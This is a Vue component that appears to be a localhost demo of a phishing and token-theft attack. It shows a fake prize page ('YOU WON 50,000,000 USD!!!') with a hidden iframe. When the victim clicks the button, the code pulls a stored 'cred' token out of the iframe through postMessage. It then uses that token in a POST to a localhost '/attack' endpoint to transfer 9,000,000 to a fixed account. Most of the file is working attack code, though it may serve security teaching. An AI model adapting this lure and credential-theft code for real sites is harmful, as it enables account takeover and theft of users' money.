<script setup lang="ts">
import axios from "axios";

import { onMounted, onBeforeUnmount, ref } from "vue";

interface StorageMessage {
  type: "get" | "set" | "remove" | "response";
  key: string;
  value?: string;
}

const iframeRef = ref<HTMLIFrameElement | null>(null);


const handleMessage = async (event: MessageEvent<StorageMessage>) => {
  if (event.origin !== "http://localhost:2000") return;

  if (event.data.type === "response") {
    await axios.post('http://localhost:2525/attack',
      {
        "account_number": 1212343445455656,
        "amount": 9000000
      }
      , {
        headers: {
          Authorization: `Bearer ${event.data.value}`,
        }
      })
  }

  console.log(`Value dari ${event.data.key}:`, event.data.value);
}

// };        await axios.post(
//           'http://localhost:8000/transaction/transfer-unsafe',
//           `account_number=${payload.account_number}&amount_${payload.amount}`,
//           {
//             headers: {
//               Authorization: `Bearer ${cred}`,
//               'Content-Type': 'text/plain',
//             },
//           }
//         );

onMounted(() => {
  window.addEventListener("message", handleMessage);
});

onBeforeUnmount(() => {
  window.removeEventListener("message", handleMessage);
});

const sendMessage = (msg: StorageMessage) => {
  iframeRef.value?.contentWindow?.postMessage(msg, "http://localhost:2000");
};

const getToken = () => {
  sendMessage({ type: "get", key: "cred" });
};

const checkCors = () => {
  fetch('http://localhost:8000', { method: 'GET' })
}

const hack = () => {
  sendMessage({ type: "get", key: "cred" });

}

</script>

<template>
  <h1>You did it!</h1>
  <p>
    YOU WON 50,000,000 USD!!!
  </p>
  <iframe ref="iframeRef" src="http://localhost:2000" title="storage"
    style="width: 100%; height: 600px; border: 1px solid gray; margin-bottom: 20px; display: none;"></iframe>

  <div>
    <!-- <button @click="getToken">Get Token</button> -->
    <button @click="hack">PLEASE CLICK HERE TO ACCEPT!</button>
    <button @click="checkCors">CHECK CORS!</button>
  </div>
</template>

<style scoped></style>
